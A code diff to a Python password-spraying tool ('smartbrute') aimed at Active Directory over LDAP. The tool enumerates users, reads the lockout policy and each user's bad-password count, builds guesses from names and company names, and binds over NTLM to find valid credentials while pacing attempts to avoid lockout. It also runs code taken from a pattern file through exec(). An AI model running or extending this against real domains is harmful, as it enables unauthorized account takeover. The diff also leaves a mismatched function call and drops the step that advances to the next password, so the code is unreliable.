@@ -14,34 +14,28 @@ import socket
 import threading
 
 class UserPasswordContainer:
-    def __init__(self, domain, username, passwords):
+    def __init__(self, domain, username, passwords, lockoutThreshold):
         self.domain = domain
         self.username = username
         self.passwords = [pw for _, pw in sorted(passwords, key=lambda x: -x[0])]
         self.password_index = 0
+        self.lockoutThreshold = lockoutThreshold
 
-    def try_next_password(self, real_conn, server, lockoutThreshold, verbose):
+    def try_next_password(self, real_conn, server, verbose):
         badpwd = -1
         try:
             badpwd_filter = f'(sAMAccountName={self.username})'
             base_dn = server.info.other['defaultNamingContext'][0]
             real_conn.search(search_base=base_dn, search_filter=badpwd_filter, attributes=['badPwdCount'])
             badpwd = real_conn.entries[0]['badPwdCount'].value
-            if badpwd + 1 >= lockoutThreshold:
+            if badpwd + 1 >= self.lockoutThreshold:
                if verbose:
-                  print(f"[*] Password try for {self.username} was skipped because badpwd was {badpwd} while threshold is {lockoutThreshold}")
+                  print(f"[*] Password try for {self.username} was skipped because badpwd was {badpwd} while threshold is {self.lockoutThreshold}")
                return False
             conn = Connection(server, user=f'{self.domain}\\{self.username}', password=self.passwords[self.password_index], auto_bind=True, authentication='NTLM')
             print(f"[+] VALID CREDENTIAL FOUND: {self.username}:{self.passwords[self.password_index]}")
             return True
         except LDAPBindError:
-            badpwd_filter = f'(sAMAccountName={self.username})'
-            base_dn = server.info.other['defaultNamingContext'][0]
-            real_conn.search(search_base=base_dn, search_filter=badpwd_filter, attributes=['badPwdCount'])
-            badpwd2 = real_conn.entries[0]['badPwdCount'].value
-            if badpwd == badpwd2:
-                print(f"[!] {self.passwords[self.password_index]} was an old password for {self.username}")
-            self.password_index += 1
             return False
 
 
@@ -78,12 +72,13 @@ def control_listener(port, verbose):
             conn, addr = s.accept()
             with conn:
                 data = conn.recv(1024).decode().strip()
-                print(f"[Control] Received from {addr}: {data}")
                 if data.lower() == "yes":
-                    print("[Control] Pausing main loop...")
+                    print(f"[Control] Received from {addr}: {data}")
+                    print("[Control] Pausing smartbrute...")
                     pause_flag.set()
                 elif data.lower() == "resume":
-                    print("[Control] Resuming main loop...")
+                    print(f"[Control] Received from {addr}: {data}")
+                    print("[Control] Resuming smartbrute...")
                     pause_flag.clear()
 
 def parse_time_window(time_str):
@@ -245,7 +240,7 @@ def try_bind(server, domain, username, password):
     except LDAPBindError:
         return False
 
-def generate_password_from_company(company_names, config_path, min_length, custom_vars = {}):
+def generate_passwords_from_toml(config_path, company_names, user_attributes, min_length, custom_vars = {}):
     if os.path.isfile(config_path):
         config = toml.load(config_path)
     else:
@@ -261,75 +256,9 @@ def generate_password_from_company(company_names, config_path, min_length, custo
     globals_config = config.get("globals", {})
     patterns = config.get("pattern", [])
 
-    for entry in patterns:
-        importance = entry.get("importance", 0)
-        code = entry.get("code")
-        years = entry.get("years", [])
-        symbols = entry.get("symbols", [""])
-        static = entry.get("static", False)
-
-        if not isinstance(years, list):
-            years = [str(years)]
-
-
-        passwords = []
-
-        for cname in company_names:
-            if code:
-                first_name = cname
-                second_name = ""
-                last_name = ""
-
-                local_vars = {
-                    "first_name": first_name,
-                    "second_name": second_name,
-                    "last_name": last_name,
-                    "passwords": passwords,
-                }
-
-
-                # Inject all other user-defined TOML variables into local_vars
-                for k, v in entry.items():
-                    if k not in ("template", "code", "importance"):
-                        local_vars[k] = v
-
-                combined_vars = globals_config.copy()
-                combined_vars.update(custom_vars)
-                combined_vars.update(local_vars)
-
-                try:
-                    exec(code, {}, combined_vars)
-                except Exception as e:
-                    print(f"Error {e} on company_name {cname}")
-
-        for pw in passwords:
-            if len(pw) >= min_length:
-                if pw in added_passwords:
-                    continue
-                else:
-                    added_passwords.add(pw)
-                if not custom_vars["complex_password"]:
-                    all_passwords.append((importance, pw))
-                elif is_complex(pw):
-                    all_passwords.append((importance, pw))
-
-    return all_passwords
-
-def generate_passwords_from_toml(config_path, user_attributes, min_length, custom_vars = {}):
-    if os.path.isfile(config_path):
-        config = toml.load(config_path)
-    else:
-        script_dir = os.path.dirname(os.path.realpath(__file__))
-        alt_path = os.path.join(script_dir, config_path)
-        if os.path.isfile(alt_path):
-            config = toml.load(alt_path)
-        else:
-            raise FileNotFoundError(f"Could not find the TOML configuration file: {config_path}")
-
-    added_passwords = set()
-    all_passwords = []
-    globals_config = config.get("globals", {})
-    patterns = config.get("pattern", [])
+    username = user_attributes.get("sAMAccountName", "")
+    first_name = user_attributes.get("givenName", "")
+    last_name = user_attributes.get("sn", "")
 
     for entry in patterns:
         importance = entry.get("importance", 0)
@@ -340,10 +269,6 @@ def generate_passwords_from_toml(config_path, user_attributes, min_length, custo
 
         if not isinstance(years, list):
             years = [str(years)]
-
-        username = user_attributes.get("sAMAccountName", "")
-        first_name = user_attributes.get("givenName", "")
-        last_name = user_attributes.get("sn", "")
 
         if not first_name:
             continue
@@ -361,8 +286,8 @@ def generate_passwords_from_toml(config_path, user_attributes, min_length, custo
                 "second_name": second_name,
                 "last_name": last_name,
                 "passwords": passwords,
+                "company_names": company_names,
             }
-
 
             # Inject all other user-defined TOML variables into local_vars
             for k, v in entry.items():
@@ -394,16 +319,16 @@ def generate_passwords_from_toml(config_path, user_attributes, min_length, custo
 def main():
     parser = argparse.ArgumentParser(description='LDAP Bruteforcer for Active Directory')
     parser.add_argument('--host', required=True, help='IP or hostname of the LDAP server')
-    parser.add_argument('--domain', required=True, help='AD domain name (e.g., fabrikam.local)')
-    parser.add_argument('--valid-user', required=True, help='A known valid domain user (for querying policies)')
-    parser.add_argument('--valid-pass', required=True, help='Password of the valid domain user')
+    parser.add_argument('--domain', required=True, help='AD domain name (e.g., example.local)')
+    parser.add_argument('--username', required=True, help='A known valid domain user (for querying policies)')
+    parser.add_argument('--password', required=True, help='Password of the valid domain user')
     parser.add_argument('--tries-per-wait', type=int, default=1, help='Number of password attempts before waiting for lockout observation window (Default: 1)')
-    parser.add_argument('--exclude-regex', nargs='*', default=["krbtgt", "\\$$","MSOL.*", "service.*", "svc.*", "HealthBox.*", "Guest"], help='Regex patterns to exclude usernames')
+    parser.add_argument('--exclude-regex', nargs='*', default=["krbtgt", "\\$$","MSOL.*", "HealthBox.*", "Guest"], help='Regex patterns to exclude usernames')
     parser.add_argument('--patterns', default='patterns.toml', help='TOML file containing password generation patterns')
     parser.add_argument('--only-show-generated-passwords', action='store_true', help='Only print generated passwords without attempting login')
     parser.add_argument('--extra-delay', type=int, default=60, help='Extra delay (in seconds) to add to the observation window before the next round (Default: 60)')
     parser.add_argument('--check', type=int, nargs='?', const=1, help='Only show policy and user filtering info. Use 2 to also show estimated duration and tries per user')
-    parser.add_argument('--company-names', nargs='*', default=[])
+    parser.add_argument('--company-names', nargs='*', default=[], help="Company names to permutate from. Generated passswords added to every user.")
     parser.add_argument('--time-based-tries', nargs='*', default=[],
                         help='Number of tries followed by the time window, e.g., "3:18:00-03:00"')
     parser.add_argument('--enable-safe-switch', action='store_true', help='Enable safe switch where sending "yes" would pause the execution on a given port')
@@ -412,8 +337,8 @@ def main():
     args = parser.parse_args()
 
     server = Server(args.host, get_info=ALL)
-    base_dn = get_default_naming_context(server, args.domain, args.valid_user, args.valid_pass)
-    policy = get_lockout_policy(server, base_dn, args.domain, args.valid_user, args.valid_pass)
+    base_dn = get_default_naming_context(server, args.domain, args.username, args.password)
+    policy = get_lockout_policy(server, base_dn, args.domain, args.username, args.password)
 
     dynamic_delay = policy['lockoutObservationWindow'] + args.extra_delay if policy['lockoutObservationWindow'] > 0 else 1.0 + args.extra_delay
 
@@ -426,7 +351,7 @@ def main():
     if args.verbose:
         print("[*] Enumerating users...")
 
-    user_attrs = enumerate_user_attributes(server, base_dn, args.domain, args.valid_user, args.valid_pass)
+    user_attrs = enumerate_user_attributes(server, base_dn, args.domain, args.username, args.password)
     if args.verbose or args.check:
         print(f"[*] Found {len(user_attrs)} users before filtering")
 
@@ -443,13 +368,11 @@ def main():
     time_based_tries = parse_time_based_tries(args.time_based_tries)
 
     all_attempts: List[UserPasswordContainer] = []
-    company_passwords = generate_password_from_company(args.company_names, args.patterns, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
-
     for user in filtered_users:
-        passwords = generate_passwords_from_toml(args.patterns, user, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
+        passwords = generate_passwords_from_toml(args.patterns, args.company_names, user, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
         if len(passwords) <= 0:
             continue
-        all_attempts.append(UserPasswordContainer(args.domain, user['sAMAccountName'], passwords + company_passwords))
+        all_attempts.append(UserPasswordContainer(args.domain, user.get("sAMAccountName", ""), passwords, policy['lockoutThreshold']))
 
     if args.verbose or args.check:
         print(f"[*] {len(all_attempts)} users remaining after filtering")
@@ -471,17 +394,19 @@ def main():
     if args.check == 2:
         return
     
-    threading.Thread(target=control_listener, args=[args.safe_port,args.verbose], daemon=True).start()
+    threading.Thread(target=control_listener, args=[args.safe_port, args.verbose], daemon=True).start()
 
     while len(all_attempts) > 0:
+        while pause_flag.is_set():
+            time.sleep(1)
         if args.verbose:
             print(f"[*] Trying at time of {get_current_time()}")
-        conn = get_connection(server, args.domain, args.valid_user, args.valid_pass)
+        conn = get_connection(server, args.domain, args.username, args.password)
         for container in all_attempts[:]:
             if container.try_next_password(conn, server, policy['lockoutThreshold'], args.verbose):
                 all_attempts.remove(container)
         if args.verbose:
-            print(f"[*] Sleeping for {dynamic_delay} seconds to avoid lockout...")
+            print(f"[*] Sleeping for {dynamic_delay}...")
         time.sleep(dynamic_delay)
 
 if __name__ == '__main__':
